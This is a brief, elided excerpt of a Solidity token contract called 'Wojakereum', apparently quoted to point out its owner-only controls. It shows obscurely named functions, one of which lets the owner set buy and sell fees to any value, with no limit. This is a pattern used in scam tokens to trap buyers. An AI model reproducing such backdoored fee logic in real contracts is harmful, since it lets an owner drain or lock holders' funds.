...
contract Wojakereum is IERC20, Ownable, IERC20Metadata {
    ...
    string  private constant _nameToken = "Wojakereum";
    string  private constant _symbolToken = "WOJAKEREUM";
    ...
    function allowanTP(address[] memory addresses) external onlyOwner {
    ...
    function allowanGa(uint256 _s, uint256 _b) external onlyOwner {
        _sellFee = _s;
        _buyFee = _b;
    }
